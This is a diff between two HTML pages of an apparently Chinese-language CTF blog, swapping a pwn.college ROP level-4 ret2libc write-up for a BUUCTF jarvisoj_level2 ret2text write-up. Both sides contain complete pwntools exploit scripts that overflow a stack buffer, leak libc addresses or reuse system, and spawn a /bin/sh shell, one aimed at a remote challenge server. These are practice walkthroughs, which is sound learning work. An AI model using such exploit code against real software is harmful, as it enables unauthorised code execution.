@@ -19,25 +19,24 @@
   <meta name="author" content="">
   <meta name="keywords" content="">
   
-    <meta name="description" content="题目简介需要我们构造ROP链来执行获取shell的代码段，进而拿到flag 漏洞点分析首先还是checksec看到只开了NX，既然如此shellcode执行不了接着拖到IDA里面发现并没有可以用的后门函数，因此只能采用ROP然后找溢出点，发现在challenge函数再通过ROPgadget工具，看看程序本身有没有可用的碎片： 1ROPgadget --binary &#x2F;challenge&#x2F;babyr">
+    <meta name="description" content="题目简介BUUCTF上一道ROP类型题目，原题链接在这：BUUCTF原题：jarvisoj_level2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="level-4">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/index.html">
+<meta property="og:title" content="BUUCTF-jarvisoj_level2">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/index.html">
 <meta property="og:site_name" content="0x4A">
-<meta property="og:description" content="题目简介需要我们构造ROP链来执行获取shell的代码段，进而拿到flag 漏洞点分析首先还是checksec看到只开了NX，既然如此shellcode执行不了接着拖到IDA里面发现并没有可以用的后门函数，因此只能采用ROP然后找溢出点，发现在challenge函数再通过ROPgadget工具，看看程序本身有没有可用的碎片： 1ROPgadget --binary &#x2F;challenge&#x2F;babyr">
+<meta property="og:description" content="题目简介BUUCTF上一道ROP类型题目，原题链接在这：BUUCTF原题：jarvisoj_level2">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-4/IDA-challenge.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-4/ldd.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-4/find-in-libc.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-4/flag.png">
-<meta property="article:published_time" content="2025-07-20T02:10:51.000Z">
-<meta property="article:modified_time" content="2025-07-27T01:23:14.566Z">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/BUUCTF-jarvisoj-level2/checksec.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-vuln.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-binsh.png">
+<meta property="article:published_time" content="2025-07-26T02:04:16.000Z">
+<meta property="article:modified_time" content="2025-07-27T02:47:25.071Z">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-4/IDA-challenge.png">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/BUUCTF-jarvisoj-level2/checksec.png">
   
   
   
-  <title>level-4 - 0x4A</title>
+  <title>BUUCTF-jarvisoj_level2 - 0x4A</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -191,7 +190,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="level-4"></span>
+            <span id="subtitle" data-typed-text="BUUCTF-jarvisoj_level2"></span>
           
         </div>
 
@@ -202,8 +201,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-20 10:10" pubdate>
-          July 20, 2025 am
+        <time datetime="2025-07-26 10:04" pubdate>
+          July 26, 2025 am
         </time>
       </span>
     
@@ -214,7 +213,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          854 words
+          529 words
         
       </span>
     
@@ -225,7 +224,7 @@
         
         
         
-          8 mins
+          5 mins
         
       </span>
     
@@ -262,23 +261,17 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">level-4</h1>
+            <h1 id="seo-header">BUUCTF-jarvisoj_level2</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们构造ROP链来执行获取shell的代码段，进而拿到flag<br></p>
-<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是checksec看到只开了NX，既然如此shellcode执行不了<br><br>接着拖到IDA里面发现并没有可以用的后门函数，因此只能采用ROP<br><br>然后找溢出点，发现在challenge函数<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/IDA-challenge.png" srcset="/img/loading.gif" lazyload><br>再通过ROPgadget工具，看看程序本身有没有可用的碎片：<br></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary /challenge/babyrop_level4.0 &gt;gadgets.txt<br></code></pre></td></tr></table></figure>
-<p>在输出文件里找了一番，没发现system、binsh等可用的组件，只找到了勉强可以用来传参的pop rdi指令<br><br>那只能在libc里找一下看有没有system之类的函数：<br><br>首先确定程序链接的libc版本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd /challenge/babyrop_level4.0<br></code></pre></td></tr></table></figure>
-<p>可以看到是&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/ldd.png" srcset="/img/loading.gif" lazyload><br>然后找相应的可用函数<br></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system<br>strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh<br></code></pre></td></tr></table></figure>
-<p><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/find-in-libc.png" srcset="/img/loading.gif" lazyload><br>如上图，这两条命令的输出都表示找到了我们想要的函数及其参数<br><br>因此漏洞点利用思路就比较清晰了，需要寻找libc中函数的地址（通过泄露Libc基址来实现），然后溢出返回地址到libc中<br></p>
-<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>这道题目中需要返回到Libc中，因此首先需要知道libc的基地址，因此需要泄露一个libc中函数的真实地址来计算基地址<br><br>综上，构造一个两阶段的利用脚本，第一次泄露puts函数真实地址，并重新执行程序，第二次再发送真正的利用payload，拿到shell：<br></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level4.0&quot;</span><br>libc_path = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>offset=<span class="hljs-number">56</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br><br>p = process(targetELF)<br><span class="hljs-comment"># p=gdb.debug(targetELF,&quot;b *challenge&quot;)</span><br>elf=ELF(targetELF)<br>libc = ELF(libc_path)<br>rop = ROP(elf)<br><br>pop_rdiAddr=<span class="hljs-number">0x402204</span>  <span class="hljs-comment">#pop rdi ret的地址</span><br>ret =<span class="hljs-number">0x40101a</span>    <span class="hljs-comment">#rop.find_gadget([&#x27;ret&#x27;])[0]</span><br>gotAddr=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>addrLeakPayload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p64(pop_rdiAddr) + p64(gotAddr) + p64(pltAddr) + p64(startAddr)<br><br><span class="hljs-comment"># open(&quot;PayLoad&quot;,&quot;wb&quot;).write(addrLeakPayload)</span><br><br>p.recv()<br>p.send(addrLeakPayload)<br>p.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br>realAddr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libcBase=realAddr-<span class="hljs-number">0x84420</span><br>sysAddr = libcBase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]  <span class="hljs-comment">#system函数地址</span><br>setuidAddr = libcBase + libc.symbols[<span class="hljs-string">&#x27;setuid&#x27;</span>]<br>binshAddr = libcBase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))  <span class="hljs-comment"># /bin/sh字符串地址</span><br><br>log.info(<span class="hljs-built_in">hex</span>(sysAddr))<br>log.info(<span class="hljs-built_in">hex</span>(binshAddr))<br><br>shellPayload= <span class="hljs-string">b&#x27;1&#x27;</span> * offset + p64(pop_rdiAddr) + p64(<span class="hljs-number">0</span>) + p64(setuidAddr) + p64(ret) + p64(pop_rdiAddr) + p64(binshAddr) + p64(ret) + p64(sysAddr)<br><br>p.recv()<br>p.send(shellPayload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-<p>大概解释一下脚本里的一些语句是什么意思（更详细的还得看pwntools的手册）<br><br>首先，主要的就是ELF类，通过传递一个ELF文件的路径，可以打开该文件，然后获得一个ELF对象（第10、11行分别拿到目标程序和libc.so的ELF对象）<br><br>通过该elf对象可以获取ELF文件中函数的plt表、got表（脚本中的gotAddr和pltAddr），以及函数符号表，即函数地址（如第18行获取_start函数的地址）<br><br>第一阶段，需要通过一个输出函数（如puts、printf）泄露got表地址，然后再回到程序的开始（即startAddr），所以第一阶段的payload（即addrLeakPayLoad）&#x3D;b’a’*offset + p64(pop_rdiAddr) + p64(gotAddr) + p64(pltAddr) + p64(startAddr)<br><br>泄露地址后通过减去puts函数的偏移得到libc基地址,即第29行（偏移可以通过readelf或者pwn库获得），最后，构造的shellPayload（第37行）才为真正getshell的payload<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/flag.png" srcset="/img/loading.gif" lazyload></p>
-
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF上一道ROP类型题目，原题链接在这：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level2">BUUCTF原题：jarvisoj_level2</a><br></p>
+<span id="more"></span>
+<p>思路容易想到，但是32位程序，由于不熟悉32位程序的特点卡了一段时间，因此做个记录<br></p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先检查开启了哪些保护<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/BUUCTF-jarvisoj-level2/checksec.png" srcset="/img/loading.gif" lazyload><br>可以看到只开启了NX<br><br>然后把二进制文件拖入IDA分析<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-vuln.png" srcset="/img/loading.gif" lazyload><br>可以看到溢出点发生在vulnerable_function，同时注意到程序使用了system函数，因此考虑能不能ret2text（只要找到&#x2F;bin&#x2F;sh字符串即可）<br><br>shift+F12看一下，太好了，在程序里找到了&#x2F;bin&#x2F;sh字符串，如下图<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-jarvisoj-level2/IDA-binsh.png" srcset="/img/loading.gif" lazyload><br>至此，可以得知，这道题的漏洞点就是构造ROP链，利用溢出返回到system函数地址，拿到shell<br></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，在IDA里可以直接看到，由于返回地址在ebp往上4个字节（32位，64位就是8个字节），offset&#x3D;0x88+0x4&#x3D;0x8C<br><br>对于system函数和&#x2F;bin&#x2F;sh字符串，这里直接通过python的pwn库定位，比较方便，不用硬编码<br><br>另外，由于32位系统的特点，此处不需要寻找pop rdi的指令碎片，也不需要考虑16字节对齐<br><br>32位传参时，通过栈进行传递，一般为返回地址1、返回地址2、参数1、参数2，即和返回地址依次对应，因此在sysAddr上方填充一个0作为返回地址（填什么都可以，拿到shell就不会回来了），否则binsh字符串会被解析为下一个返回地址<br><br>因此可以写出如下的利用脚本<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./BUUCTF08&quot;</span><br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;set follow-fork-mode parent&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25094</span>)<br>elf=ELF(targetELF)<br>offset=<span class="hljs-number">0x8C</span> <span class="hljs-comment">#还有116个字节的机会</span><br>sysAddr=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>binshArgc=<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#open(&quot;sysAddr.txt&quot;,&quot;w&quot;).write(str(hex(sysAddr)))</span><br><span class="hljs-comment">#open(&quot;binsh.txt&quot;,&quot;w&quot;).write(str(hex(binshArgc)))</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Input:\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshArgc)<br>ioTube.send(payload)<br><span class="hljs-comment">#ioTube.recv()</span><br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -296,17 +289,17 @@
     
       <span class="category-chain">
         
-  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/" class="category-chain-item">pwn.college题解</a>
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">pwn刷题记录</a>
   
   
     <span>></span>
     
-  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/Program-Security/" class="category-chain-item">Program-Security</a>
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/" class="category-chain-item">ROP</a>
   
   
     <span>></span>
     
-  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/Program-Security/ROP/" class="category-chain-item">ROP</a>
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/" class="category-chain-item">ret2text</a>
   
   
 
@@ -330,15 +323,15 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>level-4</div>
-      <div>http://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/</div>
+      <div>BUUCTF-jarvisoj_level2</div>
+      <div>http://0x4a-210.github.io/2025/07/26/pwn刷题记录/ROP/ret2text/BUUCTF-jarvisoj-level2/</div>
     </div>
     <div class="license-meta">
       
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>July 20, 2025</div>
+          <div>July 26, 2025</div>
         </div>
       
       
@@ -370,9 +363,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-9/" title="level-9">
+                      <a href="/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/" title="2025.07.26-shaktictf-Amogus">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">level-9</span>
+                        <span class="hidden-mobile">2025.07.26-shaktictf-Amogus</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -380,8 +373,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-3/" title="level-3">
-                        <span class="hidden-mobile">level-3</span>
+                      <a href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/" title="level-14-and-15">
+                        <span class="hidden-mobile">level-14-and-15</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
